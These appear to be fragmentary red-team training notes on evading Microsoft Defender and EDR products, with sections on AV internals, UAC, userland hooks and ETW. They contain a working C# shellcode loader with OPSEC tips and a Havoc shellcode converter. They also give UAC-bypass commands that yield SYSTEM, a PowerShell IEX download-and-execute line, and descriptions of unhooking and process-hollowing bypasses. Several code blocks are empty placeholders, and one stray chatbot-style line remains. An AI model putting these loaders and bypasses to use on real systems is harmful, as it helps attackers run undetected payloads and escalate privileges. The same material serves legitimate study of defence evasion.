<pre><code class="language-bash">sudo msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT=&quot;Successful Execution :)&quot; TITLE=&quot;CrimsonCORE&quot;  -f exe -o msg.exe
</code></pre>
<p>https://www.youtube.com/watch?v=0PUZbgcIMzg
create a dialogbox with metadata</p>
<pre><code class="language-csharp">using System;
using System.Diagnostics;
using System.Linq;

class Program
{
    static void Main()
    {

        // Buffer with our shellcode
        byte[] shellCode;
        shellCode = new byte[] 
        { 
            0xfc,0xfc 
        };
        Console.Clear();
        Console.Write(&quot;Shellcode: &quot;);

        foreach (byte b in shellCode)
        {
            Console.Write($&quot;0x{b:X2}, &quot;);  // X2 formats as two-character uppercase hex
        }

        Console.WriteLine();  // To add a newline at the end
        Console.WriteLine();  // To add a newline at the end

        // Find the process with the name &quot;explorer&quot;
        var explorerProcess = Process.GetProcessesByName(&quot;explorer&quot;).FirstOrDefault();

        if (explorerProcess != null)
        {
            Console.WriteLine($&quot;Process ID of explorer.exe: {explorerProcess.Id}&quot;);
        }
        else
        {
            Console.WriteLine(&quot;explorer.exe not found.&quot;);
        }
        Console.WriteLine();  // To add a newline at the end

        // Wait for any key to be pressed
        Console.WriteLine(&quot;Press any key to stop...&quot;);
        Console.ReadKey();

    }
}
</code></pre>
<h1><a class="header" href="#lab-11---payloads" id="lab-11---payloads">Lab 1.1 - Payloads</a></h1>
<h1><a class="header" href="#lab---shellcode" id="lab---shellcode">Lab - Shellcode</a></h1>
<blockquote>
<p>OPSEC HINT : Let's apply some basic best practices when we compile the following code</p>
<ol>
<li>add and icon file to the dotnet app.</li>
<li>add metadata</li>
<li>Remove comments</li>
<li>compile with CSC</li>
</ol>
</blockquote>
<p>When compiling the dotnet code you can specify the .net version</p>
<pre><code class="language-powershell">
</code></pre>
<p>We'll need the .Net Developer Pack 4.8, let's see if it is installed:</p>
<pre><code class="language-cmd">reg query &quot;HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full&quot; /v Version
</code></pre>
<p>CSC.exe is located in &quot;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe&quot;</p>
<blockquote>
<p>HINT : Remember that AMSI will behave differently with .net assemblies than it would when using powershell scripts. In a powershell script amsi.?dll is automatically loaded into powershell, with dotnet assemblies AMSI will interact with the CLR on demand.</p>
</blockquote>
<p>Let's generate a Havoc shellcode payload (on <code>KALI</code> using the Havoc GUI):</p>
<p>Screenshots + xxd (hexview) payload.</p>
<p>Switch to your windows and under <code>&quot;C:\THEV\Labs\LocalLoader&quot;</code> you'll find a csharp solution file - open that with Visual Studio 2022.</p>
<p>We'll now build our own custom (but very basic) shellcode loader in CSHARP (= dotnet assembly).</p>
<pre><code class="language-csharp">using System;
using System.Runtime.InteropServices;

namespace ShellcodePayload
{
    class Payload
    {
        [DllImport(&quot;kernel32.dll&quot;)]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport(&quot;kernel32.dll&quot;)]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport(&quot;kernel32.dll&quot;)]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main()
        {
            // (1) insert our shellcode
            byte[] shellCode = new byte[] { /* insert shellcode here */ };

            // (2) allocate memory for shellcode
            UInt32 MEM_COMMIT = 0x1000;
            UInt32 PAGE_EXECUTE_READWRITE = 0x40;
            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UInt32)shellCode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            // (3) inject shellcode into allocated memory
            Marshal.Copy(shellCode, 0, funcAddr, shellCode.Length);

            // (4) execute injected shellcode
            UInt32 threadId = 0;
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, funcAddr, IntPtr.Zero, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
</code></pre>
<hr />
<p>Here's a small shellcode formatter toos in powershell, it converts a binary file to csharp:</p>
<pre><code class="language-powershell">$fileName = &quot;C:\temp\demon.x64.bin&quot;
$fileContent = [IO.File]::ReadAllBytes($fileName)
#$fileContent
$csharpformat = '0x' + (($fileContent | ForEach-Object ToString x2 | ForEach-Object { $_ + ',' }) -join '0x')
$csharpformat = $csharpformat.SubString(0, $csharpformat.Length-1)
Write-Output &quot;[+] Shellcode length: $($csharpformat.Length) bytes&quot;
$csharpformat | add-content ($fileName + &quot;.cs&quot;)
Write-Output &quot;[+] CSharp Shellcode written to: $filename&quot;
</code></pre>
<hr />
<p>Hooka</p>
<p>Donut</p>
<h1><a class="header" href="#lab---basic-loader" id="lab---basic-loader">Lab - Basic Loader</a></h1>
<p>Generate havoc shellcode/helloworld dialog</p>
<p>Convert the shellcode to a CSharp array:</p>
<pre><code class="language-powershell">$fileName = &quot;C:\temp\demon.x64.bin&quot;
$fileContent = [IO.File]::ReadAllBytes($fileName)
#$fileContent
$csharpformat = '0x' + (($fileContent | ForEach-Object ToString x2 | ForEach-Object { $_ + ',' }) -join '0x')
$csharpformat = $csharpformat.SubString(0, $csharpformat.Length-1)
Write-Output &quot;[+] Shellcode length: $($csharpformat.Length) bytes&quot;
$csharpformat | add-content ($fileName + &quot;.cs&quot;)
Write-Output &quot;[+] CSharp Shellcode written to: $filename&quot;
</code></pre>
<p>Load this shellcode into you basic loader template:</p>
<pre><code class="language-CSHARP">
</code></pre>
<p>To build our own shellcode loader we need 4 functions:</p>
<p>VirtualAlloc (Kernel32.dll)
CreateRemoteThread (Kernel32.dll)
MarshallCopy
WaitForSingleObject (Kernel32.dll)</p>
<h1><a class="header" href="#lab---staged-loader" id="lab---staged-loader">Lab - Staged Loader</a></h1>
<h1><a class="header" href="#chapter-01---windows-defender--mde-edr" id="chapter-01---windows-defender--mde-edr">Chapter 0.1 - Windows Defender / MDE (EDR)</a></h1>
<blockquote>
<p><em><strong>TL;DR :</strong></em> This chapter explains how most AV/EDR's work - in this case we'll foce on Microsoft Defender (the AV part), MDE (Microsoft Defender for Endpoint) which is the EDR component that we'll deal with later on.</p>
</blockquote>
<p><img src="./images/MDE.jpg" alt="Screenshot" /></p>
<h3><a class="header" href="#detection-techniques-used-by-markmicrosoft-defender-antivirusmark-not-mde" id="detection-techniques-used-by-markmicrosoft-defender-antivirusmark-not-mde">Detection Techniques Used by <mark>Microsoft Defender Antivirus</mark> (Not MDE!!!)</a></h3>
<table><thead><tr><th><strong>Detection Technique</strong></th><th><strong>Description</strong></th></tr></thead><tbody>
<tr><td><strong>Signature-Based Detection</strong></td><td>Compares files against a database of known malware signatures. Effective against known threats.</td></tr>
<tr><td><strong>Heuristic Analysis</strong></td><td>Examines the behavior and characteristics of files to identify potentially malicious activity.</td></tr>
<tr><td><strong>Behavioral Monitoring</strong></td><td>Monitors the behavior of applications and processes in real-time to detect and block malicious behavior.</td></tr>
<tr><td><strong>Machine Learning</strong></td><td>Uses machine learning models to analyze and classify files based on their characteristics.</td></tr>
<tr><td><strong>Cloud-Based Detection</strong></td><td>Sends suspicious files or metadata to the cloud for further analysis using advanced algorithms.</td></tr>
<tr><td><strong>Memory Scanning</strong></td><td>Scans the system's memory to detect and remove malware that resides in memory.</td></tr>
<tr><td><strong>Network Inspection</strong></td><td>Monitors network traffic for signs of malicious activity and blocks network-based attacks.</td></tr>
</tbody></table>
<h3><a class="header" href="#advanced-technologies" id="advanced-technologies">Advanced Technologies</a></h3>
<table><thead><tr><th><strong>Technology</strong></th><th><strong>Description</strong></th></tr></thead><tbody>
<tr><td><strong>Hybrid Detection and Protection</strong></td><td>Combines on-device detection with cloud-based analysis for faster and more effective threat detection.</td></tr>
<tr><td><strong>Behavior Monitoring Engine</strong></td><td>Continuously monitors for potential attacks post-execution.</td></tr>
<tr><td><strong>Specialized Machine Learning Models</strong></td><td>Uses models for different file types and behaviors to make real-time verdicts.</td></tr>
</tbody></table>
<h3><a class="header" href="#differences-between-microsoft-defender-antivirus-mda-and-microsoft-defender-for-endpoint-mde" id="differences-between-microsoft-defender-antivirus-mda-and-microsoft-defender-for-endpoint-mde">Differences Between Microsoft Defender Antivirus (MDA) and Microsoft Defender for Endpoint (MDE)</a></h3>
<table><thead><tr><th><strong>Feature</strong></th><th><strong>Microsoft Defender Antivirus (MDA)</strong></th><th><strong>Microsoft Defender for Endpoint (MDE)</strong></th></tr></thead><tbody>
<tr><td><strong>Endpoint Detection and Response (EDR)</strong></td><td>Not available</td><td>Provides advanced EDR capabilities to detect, investigate, and respond to threats.</td></tr>
<tr><td><strong>Threat and Vulnerability Management</strong></td><td>Not available</td><td>Offers comprehensive threat and vulnerability management to identify and remediate vulnerabilities.</td></tr>
<tr><td><strong>Attack Surface Reduction (ASR)</strong></td><td>Limited</td><td>Provides extensive ASR rules to reduce the attack surface and prevent exploit techniques.</td></tr>
<tr><td><strong>Automated Investigation and Remediation</strong></td><td>Not available</td><td>Automatically investigates and remediates threats using AI and automation.</td></tr>
<tr><td><strong>Advanced Threat Hunting</strong></td><td>Not available</td><td>Offers advanced threat hunting capabilities with detailed search queries and analytics.</td></tr>
<tr><td><strong>Integration with Microsoft 365</strong></td><td>Limited</td><td>Seamlessly integrates with Microsoft 365 and other enterprise security solutions.</td></tr>
<tr><td><strong>Sandboxing and Detonation</strong></td><td>Not available</td><td>Uses sandboxing to analyze and detonate suspicious files in a controlled environment.</td></tr>
<tr><td><strong>Behavioral Analytics and Anomaly Detection</strong></td><td>Basic</td><td>Employs advanced behavioral analytics and anomaly detection to identify sophisticated threats.</td></tr>
<tr><td><strong>Threat Intelligence and Analytics</strong></td><td>Limited</td><td>Leverages Microsoft's Threat Intelligence to provide real-time insights and analytics.</td></tr>
<tr><td><strong>Centralized Management and Reporting</strong></td><td>Basic</td><td>Provides centralized management, reporting, and alerting for enterprise environments.</td></tr>
</tbody></table>
<h3><a class="header" href="#summary" id="summary">Summary</a></h3>
<ul>
<li><strong>Endpoint Detection and Response (EDR):</strong> MDE provides advanced EDR capabilities that allow organizations to detect, investigate, and respond to threats in real-time. MDA does not offer these capabilities.</li>
<li><strong>Threat and Vulnerability Management:</strong> MDE offers tools to identify and remediate vulnerabilities across the organization's environment. MDA does not include this feature.</li>
<li><strong>Attack Surface Reduction (ASR):</strong> MDE provides comprehensive ASR rules to minimize the attack surface and prevent exploit techniques. MDA has limited ASR capabilities.</li>
<li><strong>Automated Investigation and Remediation:</strong> MDE uses AI and automation to automatically investigate and remediate threats. MDA does not have this capability.</li>
<li><strong>Advanced Threat Hunting:</strong> MDE offers advanced threat hunting capabilities, allowing security analysts to perform detailed searches and analytics. MDA does not include threat hunting features.</li>
<li><strong>Integration with Microsoft 365:</strong> MDE seamlessly integrates with Microsoft 365 and other enterprise security solutions, providing a unified security experience. MDA has limited integration with Microsoft 365.</li>
<li><strong>Sandboxing and Detonation:</strong> MDE uses sandboxing to analyze and detonate suspicious files in a controlled environment, providing detailed insights into their behavior. MDA does not offer sandboxing.</li>
<li><strong>Behavioral Analytics and Anomaly Detection:</strong> MDE employs advanced behavioral analytics and anomaly detection to identify sophisticated threats. MDA has basic behavioral monitoring.</li>
<li><strong>Threat Intelligence and Analytics:</strong> MDE leverages Microsoft's Threat Intelligence to provide real-time insights and analytics. MDA has limited threat intelligence capabilities.</li>
<li><strong>Centralized Management and Reporting:</strong> MDE offers centralized management, reporting, and alerting for enterprise environments, making it easier to manage security across multiple endpoints. MDA has basic management and reporting features.</li>
</ul>
<p>These differences highlight the advanced capabilities that Microsoft Defender for Endpoint (MDE) provides, making it suitable for enterprise environments with complex security needs.</p>
<p>If you have any further questions or need more details, feel free to ask!</p>
<p><img src="./images/howEDR.jpg" alt="Screenshot" />
<img src="./images/static.jpg" alt="Screenshot" />
<img src="./images/dynamic.jpg" alt="Screenshot" />
<img src="./images/behavior.jpg" alt="Screenshot" /></p>
<p><a href="https://www.edr-telemetry.com/windows.html">https://www.edr-telemetry.com/windows.html</a></p>
<h1><a class="header" href="#heuristics" id="heuristics">Heuristics</a></h1>
<h2><a class="header" href="#differences-in-capabilities-of-heuristic-scanning-in-microsoft-defender-with-and-without-cloud-protection" id="differences-in-capabilities-of-heuristic-scanning-in-microsoft-defender-with-and-without-cloud-protection">Differences in Capabilities of Heuristic Scanning in Microsoft Defender with and without Cloud Protection</a></h2>
<h3><a class="header" href="#with-cloud-protection-turned-on" id="with-cloud-protection-turned-on">With Cloud Protection Turned On:</a></h3>
<ul>
<li><strong>Enhanced Detection:</strong> Cloud protection leverages Microsoft's vast cloud infrastructure to provide near-instant detection and blocking of new and emerging threats. This means that heuristic scanning can benefit from real-time updates and advanced machine learning models that are continuously updated in the cloud.</li>
<li><strong>Behavior Analysis:</strong> The cloud can analyze suspicious behavior and patterns more effectively, providing a higher level of protection against sophisticated threats.</li>
<li><strong>Faster Response:</strong> Cloud protection allows for quicker response times to new threats, as the cloud can process and analyze data much faster than local systems.</li>
</ul>
<h3><a class="header" href="#without-cloud-protection-turned-on" id="without-cloud-protection-turned-on">Without Cloud Protection Turned On:</a></h3>
<ul>
<li><strong>Local Heuristics:</strong> Heuristic scanning relies solely on the local database and predefined rules. This means it may not be as effective in detecting the latest threats that have not yet been added to the local database.</li>
<li><strong>Limited Updates:</strong> Without cloud protection, updates to heuristic scanning capabilities are limited to periodic updates rather than real-time enhancements.</li>
<li><strong>Slower Detection:</strong> The detection and response times may be slower, as the local system has to process and analyze threats without the additional computational power and data available in the cloud.</li>
</ul>
<h3><a class="header" href="#summary-1" id="summary-1">Summary</a></h3>
<p>Enabling cloud protection significantly enhances the heuristic scanning capabilities of Microsoft Defender by providing real-time updates, advanced behavior analysis, and faster response times.</p>
<p><strong>References:</strong></p>
<ul>
<li><a href="https://learn.microsoft.com/en-us/defender-endpoint/next-generation-protection">Overview of next-generation protection in Microsoft Defender for Endpoint</a></li>
<li><a href="https://learn.microsoft.com/en-us/defender-endpoint/adv-tech-of-mdav">Advanced technologies at the core of Microsoft Defender Antivirus</a></li>
</ul>
<h1><a class="header" href="#uac---user-account-control-privilege-escalation" id="uac---user-account-control-privilege-escalation">UAC - User Account Control (Privilege Escalation)</a></h1>
<p>User Account Control (UAC) is a security feature in Windows that helps prevent unauthorized changes to your computer. These changes can be initiated by applications, viruses, or other forms of malware. UAC ensures that such changes cannot be made without your knowledge or consent, adding an extra layer of security.</p>
<h2><a class="header" href="#how-uac-works" id="how-uac-works">How UAC Works</a></h2>
<ol>
<li>
<p><strong>Permissions and Elevation</strong>
When you or an application tries to make changes that require administrative privileges, UAC prompts you to confirm or deny the action. This is known as elevation. Only an administrator account can provide the necessary permission to proceed.</p>
</li>
<li>
<p><strong>Secure Desktop</strong>
In higher UAC settings, the prompt appears on the secure desktop. This is a screen dimming feature that makes it difficult for malware to interact with or spoof the UAC prompt. Essentially, it ensures that the prompt is coming from Windows and not from a malicious program.</p>
</li>
<li>
<p><strong>Levels of Notification</strong>
UAC has different levels of notification settings, ranging from always notifying you of changes to never notifying you (effectively turning off UAC).</p>
</li>
</ol>
<h2><a class="header" href="#user-account-control-uac-has-four-levels-of-notification-settings" id="user-account-control-uac-has-four-levels-of-notification-settings">User Account Control (UAC) has four levels of notification settings:</a></h2>
<ol>
<li>
<p><strong>Always notify</strong>: This is the highest level of protection. It notifies you before any changes are made to your computer that require administrator permissions. It also freezes other tasks until you respond.</p>
</li>
<li>
<p><strong>Notify me only when programs try to make changes to my computer</strong>: This is the <code>DEFAULT</code> level. It notifies you when programs try to make changes to your computer or install software.</p>
</li>
<li>
<p><strong>Notify me only when programs try to make changes to my computer (do not dim my desktop)</strong>: Similar to the previous level, but it doesn't switch to the Secure Desktop with desktop locking.</p>
</li>
<li>
<p><strong>Never notify</strong>: This is the lowest level of protection. UAC is disabled, and you won't be notified when changes are made to your computer.</p>
</li>
</ol>
<p>You can adjust these settings by moving the slider in the User Account Control Settings window.</p>
<h1><a class="header" href="#mitre-reference" id="mitre-reference">MITRE Reference</a></h1>
<p><img src="./images/uac_mitre.jpg" alt="image" /></p>
<p><img src="./images/uac_settings.jpg" alt="image" /></p>
<p>Running a simple powershell command that add's a registry key with some values shows nicely what this actually means:</p>
<p><img src="./images/uac_ps.jpg" alt="image" /> </p>
<p><img src="./images/uac_prompt.jpg" alt="image" /></p>
<p>Check if UAC is enabled (1 = enabled, 0 is disabled)</p>
<pre><code class="language-powershell">Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' |Select-object EnableLua
</code></pre>
<p>And to check which level it is :</p>
<pre><code class="language-powershell">Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' |Select-object ConsentPromptBehaviorAdmin
</code></pre>
<table><thead><tr><th>Value</th><th>Description</th></tr></thead><tbody>
<tr><td>0</td><td>No Prompt</td></tr>
<tr><td>1</td><td>Prompt for credential on the secure desktop</td></tr>
<tr><td>2</td><td>Prompt for CONSENT on the secure desktop</td></tr>
<tr><td>3</td><td>Prompt for Credentials on the normal desktop</td></tr>
<tr><td>4</td><td>Prompt for CONSENT on the normal desktop</td></tr>
<tr><td>5</td><td>Prompt for CONSENT for non-windows binaries</td></tr>
</tbody></table>
<p>https://www.youtube.com/watch?v=ZhaZJ4Uipqk</p>
<p>Fodhelper</p>
<p>Demo with cmd.exe -&gt; medium level even if admin
runas 
show whoami / groups
show system informer</p>
<p>start beacon as unprivileged user</p>
<p>whoami groups</p>
<pre><code class="language-bash">sudo apt install mingw-w64 -y

git clone https://github.com/icyguider/UAC-BOF-Bonanza.git
make
</code></pre>
<p>In Havoc -&gt; Script Manager Load .py</p>
<p>Set Sleep to 10</p>
<pre><code class="language-code">uac-bypass sspidatagram c:\windows\system32\cmd.exe
uac-bypass sspidatagram c:\temp\demon.x64.exe -&gt; NT Authority\System
uac-bypass silentcleanup /opt/havoc/payloads/demon.x64.exe -&gt; error
</code></pre>
<hr />
<p>Priv Esc.</p>
<pre><code class="language-powershell">powershell &quot;IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')&quot;
</code></pre>
<h1><a class="header" href="#hooks-user-land" id="hooks-user-land">Hooks (User land)</a></h1>
<p><img src="./images/hooking.jpg" alt="Screenshot" /></p>
<p>Explain hooking with <em><strong>FRIDA</strong></em></p>
<p>x64dbg</p>
<p>HookChecker mr. Un1c0d3r</p>
<p>dump exported funtions ntdll.dll kernelbase.dll kernel32.dll</p>
<p>command prompt visual studio 2022</p>
<p>dumpbin.exe /exports file.dll</p>
<p>Screenshot IDA JUMP</p>
<p>https://github.com/Almorabea/HookSweeper</p>
<p>https://github.com/Mr-Un1k0d3r/EDRs
Hook_finder64.exe</p>
<p>https://github.com/asaurusrex/Probatorum-EDR-Userland-Hook-Checker
compile in visual studio</p>
<p>Bitdefender install -&gt; 102 fnctions hooked</p>
<p>windgb:
u NtOpenProcess
!chkimg ntdll
needs symbols in windbg
.sympath srv*https://msdl.microsoft.com/download/symbols
!sym noisy;.reload /f /v</p>
<pre><code>u NtReadVirtualMemory
ntdll!NtReadVirtualMemory:
00007ffd`3ef0dcc0 e95b331600      jmp     00007ffd`3f071020
00007ffd`3ef0dcc5 cc              int     3
00007ffd`3ef0dcc6 cc              int     3
00007ffd`3ef0dcc7 cc              int     3
00007ffd`3ef0dcc8 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
00007ffd`3ef0dcd0 7503            jne     ntdll!NtReadVirtualMemory+0x15 (00007ffd`3ef0dcd5)
00007ffd`3ef0dcd2 0f05            syscall
00007ffd`3ef0dcd4 c3              ret
</code></pre>
<p>then look at the jump address and disassemble:</p>
<pre><code>u 00007ffd`3f071020
00007ffd`3f071020 36363636488da42400ffffff lea rsp,ss:[rsp-100h]
00007ffd`3f07102c 363648898c2438ffffff mov qword ptr ss:[rsp-0C8h],rcx
00007ffd`3f071036 48b9700da2cdf47d0000 mov rcx,7DF4CDA20D70h
00007ffd`3f071040 ff1522000000    call    qword ptr [00007ffd`3f071068]
00007ffd`3f071046 9c              pushfq
00007ffd`3f071047 48f78424f8feffffffffffff test qword ptr [rsp-108h],0FFFFFFFFFFFFFFFFh
00007ffd`3f071053 740a            je      00007ffd`3f07105f
00007ffd`3f071055 9d              popfq
</code></pre>
<p><strong>call qword ptr [00007ffd3f071068]:</strong> This is a crucial instruction. It's acallto an address stored in memory at00007ffd3f071068.  This is almost certainly a call to the actual hook function – the code that performs the custom actions.  The address 00007ffd3f071068` is acting as a pointer to the hook function.</p>
<p><strong>Examine 00007ffd3f071068:</strong> Usedq 00007ffd3f071068 in WinDbg to see what value is stored at that address.  This is the address of the actual hook function.</p>
<pre><code>dq 00007ffd3f071068
00007ffd`3f071068  00007df4`cda31000 cccccccc`cccccccc
00007ffd`3f071078  cccccccc`cccccccc 24a48d48`36363636
00007ffd`3f071088  89483636`ffffff00 b948ffff`ff38248c
00007ffd`3f071098  00007df4`cda20dc0 489c0000`002215ff
00007ffd`3f0710a8  fffffffe`f82484f7 36369d0a`74ffffff
00007ffd`3f0710b8  9dfffffe`f024a4ff cccccccc`ccccccc3
00007ffd`3f0710c8  00007df4`cda31000 cccccccc`cccccccc
00007ffd`3f0710d8  cccccccc`cccccccc 24a48d48`36363636
</code></pre>
<p>The important part is 00007df4cda31000. This is the address where the <em>real</em> hook function is located. The rest of the output (cccccccc...) is just filler (oftenccrepresents anint 3` instruction, a common breakpoint or padding value).</p>
<p>Next step:</p>
<p>Now that you have the address of the actual hook function (00007df4cda31000), you need to disassemble it to understand what it's doing.</p>
<pre><code class="language-code">u 00007df4`cda31000
00007df4`cda31000 9c              pushfq
00007df4`cda31001 48f705f4efffffffffffff test qword ptr [00007df4`cda30000],0FFFFFFFFFFFFFFFFh
00007df4`cda3100c 7515            jne     00007df4`cda31023
00007df4`cda3100e 9d              popfq
00007df4`cda3100f 488b4910        mov     rcx,qword ptr [rcx+10h]
00007df4`cda31013 48894c24f8      mov     qword ptr [rsp-8],rcx
00007df4`cda31018 488b8c2440ffffff mov     rcx,qword ptr [rsp-0C0h]
00007df4`cda31020 c20001          ret     100h
</code></pre>
<pre><code class="language-code">!address 00007df4`cda30000

Usage:                  &lt;unknown&gt;
Base Address:           00007df4`cda30000
End Address:            00007df4`cda31000
Region Size:            00000000`00001000 (   4.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000002          PAGE_READONLY
Type:                   00020000          MEM_PRIVATE
Allocation Base:        00007df4`cda30000
Allocation Protect:     00000002          PAGE_READONLY


Content source: 1 (target), length: 1000
</code></pre>
<p>SylentStrike (Unhooking) custom EDR</p>
<p>https://ethicalchaos.dev/2020/05/27/lets-create-an-edr-and-bypass-it-part-1/</p>
<p>Unhooking by releading ntdll.dll into memory -&gt; some EDR's detect loading NTDLL from disk...</p>
<p>Bypass, create a suspended process (this will only load NTDLL, not the EDR dll) -&gt; then copy the clean ntdll from the suspended process and overwrite it in the current process, unhooking the functions.</p>
<p>PROCESS HOLLOWING (Freeze)</p>
<p>https://hawk-eye.io/2023/06/freeze-a-payload-toolkit-for-bypassing-edrs-using-suspended-processes/</p>
<p>This can also be used to enumerate syscalls without touching NTDLL!</p>
<p>https://cymulate.com/blog/extracting-syscalls-from-a-suspended-process/</p>
<h1><a class="header" href="#etw---event-tracing-for-windows-kernel-mode" id="etw---event-tracing-for-windows-kernel-mode">ETW - Event Tracing for Windows (Kernel mode)</a></h1>
<blockquote>
<p><strong>TL;DR</strong> ETW basically is  a kernel level debug logging mechanism in Windows - it allows to gather advanced telemetry about functions being called. Windows Even Logs contain a subset of ETW events. Typically used by application developers to debug programs, but has found its way as a telemetry source for EDR's. </p>
</blockquote>
<p>Event Tracing for Windows (ETW) is a high speed tracing facility built into Windows. Using a buffering and logging mechanism implemented in the operating system kernel, ETW provides an infrastructure for events raised by both user mode (apps) and kernel mode components (drivers). ETW can be used for system and app diagnosis, troubleshooting, and performance monitoring.</p>
<p><img src="./images/etwarch.jpg" alt="Screenshot" />
https://learn.microsoft.com/en-us/windows-hardware/test/weg/instrumenting-your-code-with-etw</p>
<p><em><strong>Provider</strong></em>
A provider is an instrumented component that generates events. A provider can be a user mode app, a kernel mode driver, or the Windows kernel itself. In addition to fixed event data (header), an event can carry user data.</p>
<p>An event is an event-based representation of data. The data can be used for in-depth analysis. An event can also be used to produce counters. Counters provide a sample-based view of data. They typically contain a small set of data to show current state, for example I/O bytes per second and interrupts per second.</p>
<p>A provider must register with ETW and send events by calling the ETW Logging APIs. Providers register a callback function for enable and disable notifications so that tracing can be enabled and disabled dynamically.</p>
<p><em><strong>Session</strong></em>
The ETW session infrastructure works as an intermediate broker that relays the events from one or more providers to the consumer. A session is a kernel object that collects events into kernel buffer and sends them to a specified file or real-time consumer process. Multiple providers can be mapped to a single session, which allows users to collect data from multiple sources.</p>
<p><em><strong>Controller</strong></em>
A controller starts, stops, or updates a trace session. A session is a unit for tracing. Providers are mapped (or enabled) to a specific session. A controller enables and disables providers so that they can start sending events to ETW. Controller functionalities can be invoked with tools provided by Microsoft or you can write your own app.</p>
<p>Logman.exe is an in-box controller app. Windows Performance Recorder (WPR) in the Windows Performance Toolkit is the recommended controller process.</p>
<p><em><strong>Consumer</strong></em>
A consumer is an app that reads a logged trace file (ETL file) or captures events in an active trace session in real time, and processes events. Event Viewer and Resource Monitor are in-box ETW consumer apps.</p>
<p>Windows Performance Analyzer (WPA) in the Windows Performance Toolkit is the recommended consumer process.</p>
<p>To see which ETW providers are running on the system</p>
<pre><code class="language-code">logman query -ets
</code></pre>
<p>logman  query providers | select-string &quot;defender&quot;</p>
<p>Notice sysmon, Windows Defender...</p>
<pre><code class="language-code">logman query providers Microsoft-Windows-Kernel-Process
</code></pre>
<table><thead><tr><th>Provider</th><th>GUID</th></tr></thead><tbody>
<tr><td>Microsoft-Windows-Kernel-Process</td><td>{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}</td></tr>
</tbody></table>
<pre><code class="language-code">logman start mysession -p {22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716} -o mytest.etl -ets
logman start mysession -p Microsoft-Windows-Kernel-Process -o mytest.etl -ets
logman stop mysession -ets
tracerpt mytest.etl
</code></pre>
<p>https://github.com/Microsoft/perfview/releases</p>
<p>logman create trace MyETWSession -p &quot;Microsoft-Windows-Kernel-Process&quot; 0x8 -o &quot;C:\temp\kernel-process.etl&quot; -ets</p>
<p>.\filebeat.exe -e -c filebeat.yml -d &quot;*&quot;</p>
<hr />
<pre><code class="language-powershell">logman start Microsoft-Windows-Kernel-Memory -p Microsoft-Windows-Kernel-Memory 0xffffffffffffffff win:informational -ets
logman stop Microsoft-Windows-Kernel-Memory -ets 
</code></pre>
<p>tracerpt .\Microsoft-Windows-Kernel-Memory.etl -o Microsoft-Windows-Kernel-Memory.evtx -of evtx -lr</p>
<p>Microsoft-Windows-DotNETRuntime
Microsoft-Windows-Threat-Intelligence</p>
<h2><a class="header" href="#provider---------------------------------guid" id="provider---------------------------------guid">Provider                                 GUID</a></h2>
<p>Microsoft-Windows-Threat-Intelligence    {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}</p>
<hr />
<table><thead><tr><th>Value</th><th>Keyword</th><th>Description</th></tr></thead><tbody>
<tr><td>0x0000000000000001</td><td>KERNEL_THREATINT_KEYWORD_ALLOCVM_LOCAL</td><td>Allocates virtual memory in the local process.</td></tr>
<tr><td>0x0000000000000002</td><td>KERNEL_THREATINT_KEYWORD_ALLOCVM_LOCAL_KERNEL_CALLER</td><td>Allocates virtual memory in the local process, called from kernel mode.</td></tr>
<tr><td>0x0000000000000004</td><td>KERNEL_THREATINT_KEYWORD_ALLOCVM_REMOTE</td><td>Allocates virtual memory in a remote process.</td></tr>
<tr><td>0x0000000000000008</td><td>KERNEL_THREATINT_KEYWORD_ALLOCVM_REMOTE_KERNEL_CALLER</td><td>Allocates virtual memory in a remote process, called from kernel mode.</td></tr>
<tr><td>0x0000000000000010</td><td>KERNEL_THREATINT_KEYWORD_PROTECTVM_LOCAL</td><td>Changes the protection on a region of virtual memory in the local process.</td></tr>
<tr><td>0x0000000000000020</td><td>KERNEL_THREATINT_KEYWORD_PROTECTVM_LOCAL_KERNEL_CALLER</td><td>Changes the protection on a region of virtual memory in the local process, called from kernel mode.</td></tr>
<tr><td>0x0000000000000040</td><td>KERNEL_THREATINT_KEYWORD_PROTECTVM_REMOTE</td><td>Changes the protection on a region of virtual memory in a remote process.</td></tr>
<tr><td>0x0000000000000080</td><td>KERNEL_THREATINT_KEYWORD_PROTECTVM_REMOTE_KERNEL_CALLER</td><td>Changes the protection on a region of virtual memory in a remote process, called from kernel mode.</td></tr>
<tr><td>0x0000000000000100</td><td>KERNEL_THREATINT_KEYWORD_MAPVIEW_LOCAL</td><td>Maps a view of a file mapping into the address space of the local process.</td></tr>
<tr><td>0x0000000000000200</td><td>KERNEL_THREATINT_KEYWORD_MAPVIEW_LOCAL_KERNEL_CALLER</td><td>Maps a view of a file mapping into the address space of the local process, called from kernel mode.</td></tr>
<tr><td>0x0000000000000400</td><td>KERNEL_THREATINT_KEYWORD_MAPVIEW_REMOTE</td><td>Maps a view of a file mapping into the address space of a remote process.</td></tr>
<tr><td>0x0000000000000800</td><td>KERNEL_THREATINT_KEYWORD_MAPVIEW_REMOTE_KERNEL_CALLER</td><td>Maps a view of a file mapping into the address space of a remote process, called from kernel mode.</td></tr>
